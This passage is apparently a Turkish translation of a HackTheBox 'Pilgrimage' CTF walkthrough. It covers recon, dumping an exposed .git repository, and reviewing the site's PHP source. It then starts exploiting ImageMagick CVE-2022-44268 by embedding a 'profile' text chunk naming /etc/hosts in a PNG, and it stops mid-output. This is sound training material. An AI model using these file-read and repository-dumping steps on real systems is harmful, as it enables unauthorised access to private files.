---
{"dg-publish":true,"permalink":"/ctf/htb-pilgrimage/"}
---

Pilgrimage görüntü boyutunu küçülten bir web sitesi ile başlıyor. 
Sitede açık bir Git repository bulacağım ve bunun, görüntü küçültme işlemi için kullanılan bir ImageMagick sürümünü içerdiğini göreceğim. Bu sürümde bir file read vulnerability (dosya okuma zafiyeti) olduğunu fark edeceğim. Bu zafiyeti kullanarak host üzerinde keşif yapacağım ve SQLite database'ini çekeceğim. Bu veritabanında, SSH için çalışan bir plaintext password (düz metin şifre) bulunuyor. SSH erişimi sağladıktan sonra, root tarafından inotifywait kullanarak dosya yüklemelerini izleyen bir script çalıştığını göreceğim. Bu script, bir dosya yüklemesi olduğunda dosyada çalıştırılabilir bir şey olup olmadığını kontrol etmek için binwalk çalıştırıyor. Binwalk'ta bulunan bir zafiyeti kullanarak root olarak komut çalıştırmayı sağlayacağım."

## Box Info

|Name|[Pilgrimage](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fpilgrimage)[![Pilgrimage](https://0xdf.gitlab.io/icons/box-pilgrimage.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fpilgrimage)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fpilgrimage)|
|---|---|
|Release Date|[24 Jun 2023](https://twitter.com/hackthebox_eu/status/1671888296912486403)|
|Retire Date|25 Nov 2023|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Pilgrimage](https://0xdf.gitlab.io/img/pilgrimage-diff.png)|
|Radar Graph|![Radar chart for Pilgrimage](https://0xdf.gitlab.io/img/pilgrimage-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:17:00[![Embargo](https://www.hackthebox.com/badge/image/267436)](https://app.hackthebox.com/users/267436)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|00:20:33[![szymex73](https://www.hackthebox.com/badge/image/139466)](https://app.hackthebox.com/users/139466)|
|Creator|[![coopertim13](https://www.hackthebox.com/badge/image/55851)](https://app.hackthebox.com/users/55851)|


## Recon

### nmap

nmap iki açık TCP portu bulur, SSH (22) ve HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.219
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-21 14:25 EST
Nmap scan report for 10.10.11.219
Host is up (0.092s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds



oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.219
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-21 14:44 EST
Nmap scan report for 10.10.11.219
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
```

OpenSSH sürümüne dayanarak, host muhtemelen Debian 11 Bullseye çalıştırıyor.

Port 80, **pilgrimage.htb** adresine bir yönlendirme gösteriyor. **ffuf** ile **subdomain** araması yapacağım, bir şey bulamayacağım ve ardından aşağıdaki satırı `/etc/hosts` dosyasına ekleyeceğim:

```
10.10.11.219 pilgrimage.htb
```

Genellikle göstermediğim ama her zaman yaptığım (ya da en azından yapmayı hatırlamaya çalıştığım) bir şey, hostu nmap ile domain adına göre yeniden taramaktır. Bu durumda, ek sonuçlar vardır:

```
oxdf@hacky$ nmap -p 22,80 -sCV pilgrimage.htb
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-21 15:37 EST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
|_http-title: Pilgrimage - Shrink Your Images
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds
```

Web sitesinde bir Git deposu var. nmap bunu daha önce bulamadı çünkü http://10.10.11.217 adresine yapılan HTTP isteği, yol ne olursa olsun sadece 301 yönlendirmesi alıyor. Ancak http://pilgrimage.htb adresini taradığında, http-git script'i ile depoyu buluyor. Bunu daha sonra feroxbuster ile de bulabilirdim, ancak genellikle kullandığım kelime listesi .git'i içermiyor.


### pilgrimage.htb - TCP 80

#### Site

Web sitesi bir görüntü boyutu küçültme aracıdır:

![Pasted image 20250107024601.png](/img/user/resimler/Pasted%20image%2020250107024601.png)


Bir resim verip “ Shrink” e tıklarsam, daha küçük resmin URL'sini döndürüyor:

![Pasted image 20250107024624.png](/img/user/resimler/Pasted%20image%2020250107024624.png)

URL, yüklenen görüntünün küçültülmüş bir versiyonuna yönlendiriyor. `/shrunk` adresini ziyaret etmeye çalıştığımda ise 403 Forbidden hatası alıyorum.

Bir hesap oluşturup giriş yaptığımda, **/dashboard.php** adresinde bir **dashboard** açılıyor. Bu **dashboard**, şu anda boş olan bir tabloyla orijinal dosyaları ve küçültülmüş URL'leri gösteriyor.

![Pasted image 20250107024750.png](/img/user/resimler/Pasted%20image%2020250107024750.png)

Aynı resmi farklı isimlerle ve aynı isimle yükleyerek oynayacağım:

![Pasted image 20250107024819.png](/img/user/resimler/Pasted%20image%2020250107024819.png)

Resim veya resim adı aynı olsa bile yeni resim adı her yüklemede değişiyor gibi görünüyor. Ayrıca her zaman 655c ile başlıyor, bu da adı oluşturanın bir hash olmadığını gösteriyor.


#### Tech Stack

HTTP response header'ları, nmap tarafından tanımlanan nginx'in ötesinde çok fazla ek bilgi vermiyor:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 21 Nov 2023 12:13:09 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 7624
```

Site, sayfaların uzantılarına bakıldığında açıkça PHP tabanlıdır.


#### Directory Brute Force

Siteye karşı feroxbuster'ı çalıştıracağım ve sitenin PHP olduğunu bildiğim için -x php'yi dahil edeceğim:

```
oxdf@hacky$ feroxbuster -u http://pilgrimage.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://pilgrimage.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      198l      494w     7621c http://pilgrimage.htb/
301      GET        7l       11w      169c http://pilgrimage.htb/tmp => http://pilgrimage.htb/tmp/
302      GET        0l        0w        0c http://pilgrimage.htb/logout.php => http://pilgrimage.htb/
200      GET      171l      403w     6173c http://pilgrimage.htb/register.php
200      GET      171l      403w     6166c http://pilgrimage.htb/login.php
301      GET        7l       11w      169c http://pilgrimage.htb/assets => http://pilgrimage.htb/assets/
200      GET      198l      494w     7621c http://pilgrimage.htb/index.php
301      GET        7l       11w      169c http://pilgrimage.htb/assets/js => http://pilgrimage.htb/assets/js/
301      GET        7l       11w      169c http://pilgrimage.htb/assets/css => http://pilgrimage.htb/assets/css/
301      GET        7l       11w      169c http://pilgrimage.htb/assets/images => http://pilgrimage.htb/assets/images/
302      GET        0l        0w        0c http://pilgrimage.htb/dashboard.php => http://pilgrimage.htb/login.php
301      GET        7l       11w      169c http://pilgrimage.htb/vendor => http://pilgrimage.htb/vendor/
301      GET        7l       11w      169c http://pilgrimage.htb/vendor/jquery => http://pilgrimage.htb/vendor/jquery/
404      GET        0l        0w      153c http://pilgrimage.htb/assets/domaincheck.php
404      GET        0l        0w      153c http://pilgrimage.htb/landing-page-4
404      GET        0l        0w      153c http://pilgrimage.htb/assets/images/news6.php
404      GET        0l        0w      153c http://pilgrimage.htb/vendor/javeabenitachell.php
[####################] - 4m    240000/240000  0s      found:17      errors:2682   
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/ 
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/tmp/ 
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/assets/ 
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/assets/js/ 
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/assets/css/ 
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/assets/images/ 
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/vendor/ 
[####################] - 4m     30000/30000   106/s   http://pilgrimage.htb/vendor/jquery/ 
```

**Feroxbuster** taramasında bulunanlar:

1. **200 OK**
    
    - `http://pilgrimage.htb/`: Ana sayfa.
    - `http://pilgrimage.htb/register.php`: Kayıt olma sayfası.
    - `http://pilgrimage.htb/login.php`: Giriş yapma sayfası.
    - `http://pilgrimage.htb/index.php`: Ana **index** dosyası.
2. **301 Redirect (Yönlendirme)**
    
    - `http://pilgrimage.htb/tmp` → `http://pilgrimage.htb/tmp/`: Muhtemelen geçici dosyaların bulunduğu bir dizin.
    - `http://pilgrimage.htb/assets` → `http://pilgrimage.htb/assets/`: Varlık dosyalarının dizini (CSS, JS, vb.).
    - `http://pilgrimage.htb/vendor` → `http://pilgrimage.htb/vendor/`: Üçüncü taraf kütüphaneler ve araçlar için kullanılan dizin.
3. **302 Redirect (Oturum Kontrolü)**
    
    - `http://pilgrimage.htb/dashboard.php` → `http://pilgrimage.htb/login.php`: **Dashboard**, giriş yapılmamışsa otomatik olarak login sayfasına yönlendiriyor.
    - `http://pilgrimage.htb/logout.php` → `http://pilgrimage.htb/`: Çıkış yapıldığında ana sayfaya yönlendiriyor.
4. **404 Not Found**
    
    - Birkaç gereksiz ya da bulunamayan dosya/dizin:
        - `http://pilgrimage.htb/assets/domaincheck.php`
        - `http://pilgrimage.htb/assets/images/news6.php`
        - `http://pilgrimage.htb/vendor/javeabenitachell.php`
5. **Diğer Önemli Dizinler**
    
    - `http://pilgrimage.htb/assets/js/`: JavaScript dosyalarının olduğu bir dizin.
    - `http://pilgrimage.htb/assets/css/`: CSS dosyalarının olduğu bir dizin.
    - `http://pilgrimage.htb/assets/images/`: Görsellerin bulunduğu bir dizin.
    - `http://pilgrimage.htb/vendor/jquery/`: jQuery ile ilgili dosyaların bulunduğu dizin.

### Not:

- `tmp`, `assets`, ve `vendor` gibi dizinlerde detaylı inceleme yapılabilir.
- `dashboard.php`'ye giriş yaptıktan sonra erişim sağlanabilir.
- `tmp/` dizini, dosya yükleme/zafiyet araştırmaları için önemli olabilir.


/tmp ilginç, ancak ziyaret edildiğinde 403 forbidden hatası alınıyor.


## Shell as emily

### Get Git Repo

[git-dumper](https://github.com/arthaud/git-dumper/tree/master) web sitelerinden Git repolarını çekmek için güzel bir araçtır. Pipx install git-dumper ile yüklenir. Sonuçların gideceği bir dizin oluşturacağım ve ardından Pilgrimage ile çalıştıracağım:


```
oxdf@hacky$ git-dumper http://pilgrimage.htb git
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/post-receive.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/objects/info/packs [404]
[-] http://pilgrimage.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://pilgrimage.htb/.git/index [200]
[-] Fetching http://pilgrimage.htb/.git/info/exclude [200]
[-] Finding refs/
[-] Fetching http://pilgrimage.htb/.git/FETCH_HEAD [404]
[-] http://pilgrimage.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/ORIG_HEAD [404]
[-] http://pilgrimage.htb/.git/ORIG_HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/config [200]
[-] Fetching http://pilgrimage.htb/.git/info/refs [404]
[-] http://pilgrimage.htb/.git/info/refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/HEAD [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://pilgrimage.htb/.git/logs/refs/stash [404]
[-] http://pilgrimage.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/packed-refs [404]
[-] http://pilgrimage.htb/.git/packed-refs responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/HEAD [404]
[-] Fetching http://pilgrimage.htb/.git/refs/heads/master [200]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/remotes/origin/master [404]
[-] http://pilgrimage.htb/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/stash [404]
[-] http://pilgrimage.htb/.git/refs/stash responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/index/refs/heads/master responded with status code 404                                          
[-] Fetching http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://pilgrimage.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://pilgrimage.htb/.git/objects/e9/2c0655b5ac3ec2bfbdd015294ddcbe054fb783 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b6/c438e8ba16336198c2e62fee337e126257b909 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/49/cd436cf92cc28645e5a8be4b1973683c95c537 [200]                                         
[-] Fetching http://pilgrimage.htb/.git/objects/ff/dbd328a3efc5dad2a97be47e64d341d696576c [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c3/27c2362dd4f8eb980f6908c49f8ef014d19568 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2b/95e3c61cd8f7f0b7887a8151207b204d576e14 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8a/62aac3b8e9105766f3873443758b7ddf18d838 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/e1/a40beebc7035212efdcb15476f9c994e3634a7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://pilgrimage.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/objects/6c/965df00a57fd13ad50b5bbe0ae1746cdf6403d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a5/29d883c76f026420aed8dbcbd4c245ed9a7c0b [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/18930edec4da46019a1bac06ecb6ec6f7975bb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/96/3349e4f7a7a35c8f97043c20190efbe20d159a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fa/175a75d40a7be5c3c5dee79b36f626de328f2e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/2ef7cfabc9cf1d117d7a88f3a63cadbb40cca3 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b4/21518638bfb4725d72cc0980d8dcaf6074abe7 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/a4c2fd4e5b2374c6e212d1800097e3b30ff4e2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8e/42bc52e73caeaef5e58ae0d9844579f8e1ae18 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/11/dbdd149e3a657bc59750b35e1136af861a579f [200]
[-] Fetching http://pilgrimage.htb/.git/objects/29/4ee966c8b135ea3e299b7ca49c450e78870b59 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c2/cbe0c97b6f3117d4ab516b423542e5fe7757bc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fb/f9e44d80c149c822db0b575dbfdc4625744aa4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/54/4d28df79fe7e6757328f7ecddf37a9aac17322 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/06/19fc1c747e6278bbd51a30de28b3fcccbd848a [200]
[-] Fetching http://pilgrimage.htb/.git/objects/fd/90fe8e067b4e75012c097a088073dd1d3e75a4 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/46/44c40a1f15a1eed9a8455e6ac2a0be29b5bf9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/c4/3565452792f19d2cf2340266dbecb82f2a0571 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/2f/9156e434cfa6204c9d48733ee5c0d86a8a4e23 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/5f/ec5e0946296a0f09badeb08571519918c3da77 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/b2/15e14bb4766deff4fb926e1aa080834935d348 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/47/6364752c5fa7ad9aa10f471dc955aac3d3cf34 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/cd/2774e97bfe313f2ec2b8dc8285ec90688c5adb [200]
[-] Fetching http://pilgrimage.htb/.git/objects/1f/8ddab827030fbc81b7cb4441ec4c9809a48bc1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f2/b67ac629e09e9143d201e9e7ba6a83ee02d66e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/76/a559577d4f759fff6af1249b4a277f352822d5 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/50/210eb2a1620ef4c4104c16ee7fac16a2c83987 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/88/16d69710c5d2ee58db84afa5691495878f4ee1 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/dc/446514835fe49994e27a1c2cf35c9e45916c71 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f3/e708fd3c3689d0f437b2140e08997dbaff6212 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/36/c734d44fe952682020fd9762ee9329af51848d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/93/ed6c0458c9a366473a6bcb919b1033f16e7a8d [200]
[-] Fetching http://pilgrimage.htb/.git/objects/26/8dbf75d02f0d622ac4ff9e402175eacbbaeddd [200]
[-] Fetching http://pilgrimage.htb/.git/objects/a7/3926e2965989a71725516555bcc1fe2c7d4f9e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/81/703757c43fe30d0f3c6157a1c20f0fea7331fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/9e/ace5d0e0c82bff5c93695ac485fe52348c855e [200]
[-] Fetching http://pilgrimage.htb/.git/objects/8f/155a75593279c9723a1b15e5624a304a174af2 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/98/10e80fba2c826a142e241d0f65a07ee580eaad [200]
[-] Fetching http://pilgrimage.htb/.git/objects/23/1150acdd01bbbef94dfb9da9f79476bfbb16fc [200]
[-] Fetching http://pilgrimage.htb/.git/objects/ca/d9dfca08306027b234ddc2166c838de9301487 [200]
[-] Fetching http://pilgrimage.htb/.git/objects/f1/8fa9173e9f7c1b2f30f3d20c4a303e18d88548 [200]
[-] Running git checkout .
```

Bu işlem, **.git** klasörünü indiriyor. Bu klasör, **repository** hakkında tüm **metadata** ve içindeki dosyaların en son commit'teki içeriklerini barındırıyor. Son satırda çalıştırılan `git checkout .` komutu, dizini etkili bir şekilde en son commit'e sıfırlıyor ve bu sayede tüm bu dosyalar yeniden oluşturuluyor.

----

Burada anlatılan süreç şu şekilde:

1. **.git Klasörü Nedir?**
    
    - **.git** klasörü, bir **Git repository**'sindeki tüm değişiklik geçmişini, dosyaların önceki sürümlerini ve repository'ye ait yapılandırma bilgilerini içerir.
2. **git checkout . Ne Yapar?**
    
    - `git checkout .` komutu, o anki çalışma dizinindeki (working directory) tüm değişiklikleri iptal eder ve dosyaları en son **commit**'teki (kaydedilen son sürüm) haline döndürür.
    - Örneğin, bir dosyayı değiştirdiyseniz veya sildiyseniz, bu komut o dosyayı en son commit'te olduğu şekliyle geri yükler.
3. **Bu Durumda Ne Oluyor?**
    
    - **.git** klasörünü indirdikten sonra, bu klasör sayesinde repository'nin geçmişine ve dosyalarının önceki sürümlerine erişilebilir.
    - `git checkout .` çalıştırıldığında, bu işlem repository'deki dosyaları en son commit'teki haline döndürür, yani dosyalar yeniden oluşturulur.

### Özetle:

Bu süreç, silinmiş veya değiştirilmiş dosyaları **Git** sayesinde geri yüklemek için kullanılıyor. İndirilen **.git** klasörü, dosyaların orijinal içeriklerine ulaşmayı mümkün kılıyor. Bu yüzden, eğer bir saldırgan **.git** klasörüne erişim sağlarsa, site üzerindeki önemli dosyaları (örneğin, kaynak kodlar veya yapılandırma dosyaları) kolayca elde edebilir.

---

```
oxdf@hacky$ ls git/
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```


### CVE-2022-44268

#### Source Code Analysis

Resim içeren POST istekleri index.php'ye gider. POST'u alır ve bir dosya nesnesi oluşturarak /tmp'ye kaydeder:

```
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
```

Daha sonra sonucu alır ve `uniqid`'den (PHP'de[ zamana dayalı benzersiz bir kimliktir](https://www.php.net/manual/en/function.uniqid.php)) yeni bir dosya adı oluşturur:

```
   if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
```

Daha sonra %50 oranında küçülterek dönüştürmek için magick'i çalıştırır ve orijinal dosyayı siler:

```
exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);

unlink($upload->getFullPath());
```

Kullanıcı oturum açmışsa, yeni yolu ve orijinal yolu DB'ye kaydeder:

```
$upload_path = "http://pilgrimage.htb/shrunk/" . $newname . $mime;
if(isset($_SESSION['user'])) {
        $db = new PDO('sqlite:/var/db/pilgrimage');
        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
        $stmt->execute(array($upload_path,$_FILES["toConvert"]["name"],$_SESSION['user']));
      }
      
      header("Location: /?message=" . $upload_path . "&status=success");
```

#### Identify CVE

**Repository**'de bir **magick** kopyası var ve bu bir çalıştırılabilir dosya (**executable**).

```
oxdf@hacky$ file magick 
magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9fdbc145689e0fb79cb7291203431012ae8e1911, stripped
```

Ayrıca şu komutu da çalıştıracak:

```
oxdf@hacky$ ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Bu versiyonu arattığınızda CVE-2022-44268 için bir sürü referans bulabilirsiniz:

![Pasted image 20250107030044.png](/img/user/resimler/Pasted%20image%2020250107030044.png)

Sorun “profile” text stringinin ImageMagick tarafından nasıl ele alındığı ile ilgilidir. [Metabaseq'teki bu gönderi](https://www.metabaseq.com/imagemagick-zero-days/), ayrıntılarla gerçekten güzel bir iş çıkarıyor ve bu üst düzey açıklamayı sunuyor:

Kötü niyetli bir aktör, bir **PNG** dosyası oluşturabilir veya mevcut bir dosyayı kullanarak içine metinsel bir **chunk type** (örneğin, **tEXt**) ekleyebilir. Bu türlerin bir **keyword** (anahtar kelime) ve bir metin dizesi bulunur. Eğer **keyword**, tırnak işareti olmadan "profile" dizesiyse, **ImageMagick** bu metin dizisini bir dosya adı olarak yorumlar ve içeriği bir **raw profile** olarak yüklemeye çalışır. Belirtilen dosya adı "-" (tek bir tire) olduğunda, **ImageMagick** içeriği standart girdiden (**standard input**) okumaya çalışır ve bu durum potansiyel olarak sürecin sonsuza kadar beklemesine neden olabilir.

**ImageMagick**'te **profile**, bir görüntüde renklerin nasıl temsil edileceğini ve işleneceğini tanımlayan bir dizi renk yönetimi ayarını ifade eder.  
Renk yönetimi önemlidir, çünkü farklı cihazlar (örneğin, kameralar, monitörler ve yazıcılar) renkleri farklı şekilde yorumlayabilir ve yeniden üretebilir.  
**Profiles**, çeşitli cihazlar arasında tutarlı ve doğru renk temsili sağlamak için kullanılır.

### POC Exploit

#### Manual

Piyasada birçok POC komut dosyası var, ancak ben bunu manuel olarak yapmayı tercih ediyorum [Bu](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC) Github sayfasında bunu yapmak için adımlar var. Genel bir PNG ile başlayacağım ve profil stringini eklemek için pngcrush kullanacağım:

```
oxdf@hacky$ pngcrush -text a "profile" "/etc/hosts" poc.png
  Recompressing IDAT chunks in poc.png to pngout.png
   Total length of data found in critical chunks            =     21089
   Best pngcrush method        =   6 (ws 15 fm 6 zl 9 zs 0) =     20070
CPU time decode 0.004922, encode 0.052924, other 0.001132, total 0.059650 sec
```

---

### Açıklama:

1. **`pngcrush`**:
    
    - **PNG** dosyalarını optimize etmek ve üzerinde değişiklikler yapmak için kullanılan bir araçtır.
2. **`-text a`**:
    
    - Bir **text chunk** (metin parçası) eklemek için kullanılır.
    - `a`, eklenecek olan metni temsil eder (anahtar kelime ve değer).
3. **`"profile"`**:
    
    - Bu, eklenen metinsel bilginin anahtar kelimesidir. Bu durumda, `"profile"` adında bir **keyword** ekleniyor.
4. **`"/etc/hosts"`**:
    
    - Anahtar kelimeyle ilişkili metin içeriğidir. Burada, `/etc/hosts` dosyasının yolu metin içeriği olarak eklenmiştir.
5. **`poc.png`**:
    
    - İşlenecek olan hedef **PNG** dosyasıdır.

### Komut Ne Yapıyor?

1. **`poc.png`** dosyasına, `"profile"` anahtar kelimesi ile ilişkili olarak `/etc/hosts` metin bilgisini içeren bir **text chunk** ekliyor.
2. İşlem sonucunda, dosyayı sıkıştırarak veya optimize ederek çıktı dosyasını oluşturuyor. Çıktı genellikle `pngout.png` adıyla kaydedilir.

---


Bu, tEXt bölümündeki meta verilere sahip pngout.png adında yeni bir dosya oluşturur:

```
oxdf@hacky$ exiv2 -pS pngout.png 
STRUCTURE OF PNG FILE: pngout.png
 address | chunk |  length | data                           | checksum
